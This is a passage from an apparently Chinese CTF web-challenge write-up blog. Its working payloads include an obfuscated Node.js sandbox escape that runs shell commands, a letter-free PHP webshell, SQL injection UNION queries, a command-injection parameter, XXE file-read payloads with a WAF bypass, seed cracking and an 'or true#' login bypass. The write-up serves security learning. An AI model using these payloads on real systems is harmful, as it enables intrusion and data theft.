class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))();</span><span class="o">%</span><span class="mi">20</span><span class="n">try</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">Object</span><span class="p">[</span><span class="o">`</span><span class="n">preventExtensions</span><span class="o">`</span><span class="p">](</span><span class="n">Buffer</span><span class="p">[</span><span class="o">`</span><span class="k">from</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))[</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">]</span><span class="o">%</span><span class="mi">20</span><span class="o">=%</span><span class="mi">201</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="nf">catch</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="err">{</span><span class="o">%</span><span class="mi">20</span><span class="n">return</span><span class="o">%</span><span class="mi">20</span><span class="n">e</span><span class="p">[</span><span class="o">`</span><span class="n">a</span><span class="o">`</span><span class="p">](()</span><span class="o">=%</span><span class="mi">3</span><span class="n">E</span><span class="err">{}</span><span class="p">)[</span><span class="o">`</span><span class="n">mainModule</span><span class="o">`</span><span class="p">][[</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">q</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">u</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)]([</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">h</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">i</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">l</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">d</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">_</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">p</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">r</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">o</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">s</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">))[[</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">x</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">e</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">S</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">y</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">n</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">c</span><span class="o">`</span><span class="p">][</span><span class="o">`</span><span class="k">join</span><span class="o">`</span><span class="p">](</span><span class="o">``</span><span class="p">)](</span><span class="o">`</span><span class="n">cat</span><span class="o">+%</span><span class="mi">2</span><span class="n">fflag</span><span class="o">`</span><span class="p">)[</span><span class="o">`</span><span class="n">toString</span><span class="o">`</span><span class="p">]();</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="o">%</span><span class="mi">20</span><span class="err">}</span><span class="p">)()</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Âè¶‰∏ÄÁßçÂäûÊ≥ïÊòØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">prototype</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">`</span><span class="err">${</span><span class="o">`</span><span class="err">${</span><span class="o">`</span><span class="n">prototyp</span><span class="o">`</span><span class="err">}</span><span class="n">e</span><span class="o">`</span><span class="err">}</span><span class="o">`</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÊääÂÖ≥ÈîÆÂ≠óÂÖ®ÈÉ®ÊõøÊç¢ÊàêËøôÁßçÊ†ºÂºè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">(</span><span class="kd">function</span> <span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">TypeError</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`prototyp`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">][</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">]</span> <span class="o">=</span> <span class="nx">f</span><span class="p">=&gt;</span><span class="nx">f</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`constructo`</span><span class="si">}</span><span class="sb">r`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`return this.proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nb">Object</span><span class="p">.</span><span class="nx">preventExtensions</span><span class="p">(</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="sb">``</span><span class="p">)).</span><span class="nx">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">e</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`get_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">](()=&gt;{}).</span><span class="nx">mainModule</span><span class="p">[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`requir`</span><span class="si">}</span><span class="sb">e`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`child_proces`</span><span class="si">}</span><span class="sb">s`</span><span class="si">}</span><span class="sb">`</span><span class="p">)[</span><span class="sb">`</span><span class="si">${</span><span class="sb">`</span><span class="si">${</span><span class="sb">`exe`</span><span class="si">}</span><span class="sb">cSync`</span><span class="si">}</span><span class="sb">`</span><span class="p">](</span><span class="sb">`whoami`</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="suctf-2018getshell">[SUCTF 2018]GetShell
</h2><p>Êó†Â≠óÊØçÊï∞Â≠ówebshell</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">[];</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$__</span><span class="o">=</span><span class="nv">$_</span><span class="o">.</span><span class="nv">$_</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$_</span><span class="o">=</span><span class="p">(</span><span class="nv">$_</span><span class="o">==</span><span class="nv">$__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$__</span><span class="o">=</span><span class="p">(</span><span class="nv">$_</span><span class="o">==</span><span class="nv">$_</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$___</span> <span class="o">=</span> <span class="o">~</span><span class="nx">Âå∫</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">ÂÜà</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Âå∫</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Âã∫</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">ÁöÆ</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Èíà</span><span class="p">[</span><span class="nv">$__</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$____</span> <span class="o">=</span> <span class="o">~</span><span class="nx">Á†Å</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">ÂØ∏</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Â∞è</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Ê¨†</span><span class="p">[</span><span class="nv">$__</span><span class="p">]</span><span class="o">.~</span><span class="nx">Á´ã</span><span class="p">[</span><span class="nv">$__</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$____</span><span class="p">(</span><span class="nv">$$__</span><span class="p">[</span><span class="nx">_</span><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>system($_POST[_]) </code></p>
<p>ËØªÁéØÂ¢ÉÂèòÈáè</p>
<h2 id="b01lers2020life-on-mars">[b01lers2020]Life on Mars
</h2><p>sqlÊ≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata&amp;{}&amp;_=1745230942307
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=&#39;alien_code&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name=&#39;code&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/query?search=amazonis_planitia/**/union/**/select/**/1,group_concat(code)from/**/alien_code.code
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="easybypass">EasyBypass
</h2><p>ez</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/?comm1=&#34;;sort+/fla?;&#34;&amp;comm2=1
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ÊûÅÂÆ¢Â§ßÊåëÊàò-2020roamphp1-welcome">[ÊûÅÂÆ¢Â§ßÊåëÊàò 2020]Roamphp1-Welcome
</h2><p>post‰º†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">roam1[]=1&amp;roam2[]=2
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="csawqual-2019web_unagi">[CSAWQual 2019]Web_Unagi
</h2><p>ÊúâwafÁöÑxxe,È¢òÁõÆÁªôÊ†ºÂºè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;users&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;username&gt;</span>alice<span class="nt">&lt;/username&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;password&gt;</span>passwd1<span class="nt">&lt;/password&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;name&gt;</span>Alice<span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;email&gt;</span>alice@fakesite.com<span class="nt">&lt;/email&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;group&gt;</span>CSAW2019<span class="nt">&lt;/group&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/users&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áõ¥Êé•ÂÖ®ÈÉ®ÂèòÊàê&amp;xxe;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE users [
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34; &gt;</span>]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;users&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;user&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;username&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/username&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;password&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/password&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;name&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;email&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/email&gt;</span>  
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;group&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/group&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;intro&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/intro&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/user&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/users&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂä†ÁöÑintroÊòØËÉΩËØªÂÖ®ÈÉ®ÁöÑÔºå‰ΩÜÊòØË¢´waf‰∫ÜÔºåÁºñÁ†ÅÁªïËøá</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">iconv -f utf8 -t utf-16 2.xml&gt;1.xml
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="mrctf2020ezaudit">[MRCTF2020]Ezaudit
</h2><p>php_mt_seedÁàÜÁßçÂ≠ê</p>
<p>ÂÖàÂ∞ÜÂØÜÈí•ËΩ¨Êç¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">str1</span><span class="o">=</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str2</span><span class="o">=</span><span class="s1">&#39;KVQP0LdJKRaV3n9D&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str3</span> <span class="o">=</span> <span class="n">str1</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)):</span>  
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">str1</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÊ†πÊçÆÈ¢òÁõÆÈÄªËæëÁÆóÁßÅÈí•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">1775196155</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ÂÖ¨Èí•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">public_key</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">16</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$strings1</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$public_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$public_key</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$strings1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$strings1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$public_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//ÁßÅÈí•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">private_key</span><span class="p">(</span><span class="nv">$length</span> <span class="o">=</span> <span class="mi">12</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$strings2</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$private_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$private_key</span> <span class="o">.=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$strings2</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$strings2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$private_key</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">public_key</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">private_key</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁâàÊú¨Ë¶ÅÊòØÂâç‰∏ãÁÆóÁßçÂ≠êÁöÑÁâàÊú¨</p>
<p>ÁÑ∂Âêé‰∏áËÉΩÂØÜÁ†ÅÁôªÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">crispr
</span></span><span class="line"><span class="cl">1&#39; or true#
</span></span><span class="line"><span class="cl">XuNhoueCDCGc
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bsidescf-2019svgmagic">[BSidesCF 2019]SVGMagic
</h2><p>Âà©Áî®svgÊ†áÁ≠æÊù•ËØªflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE note [
</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY file SYSTEM &#34;file:///proc/self/cwd/flag.txt&#34; &gt;</span>
</span></span><span class="line"><span class="cl">]&gt;
</span></span><span class="line"><span class="cl"><span class="nt">&lt;svg</span> <span class="na">height=</span><span class="s">&#34;200&#34;</span> <span class="na">width=</span><span class="s">&#34;1000&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">&#34;10&#34;</span> <span class="na">y=</span><span class="s">&#34;20&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/text&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/svg&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>/proc/self/cwdË°®Á§∫ÂΩìÂâçÁõÆÂΩï‰∏ãËøêË°åÁöÑÊñá‰ª∂</p>
<h2 id="isitdtu-2019easyphp">[ISITDTU 2019]EasyPHP
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
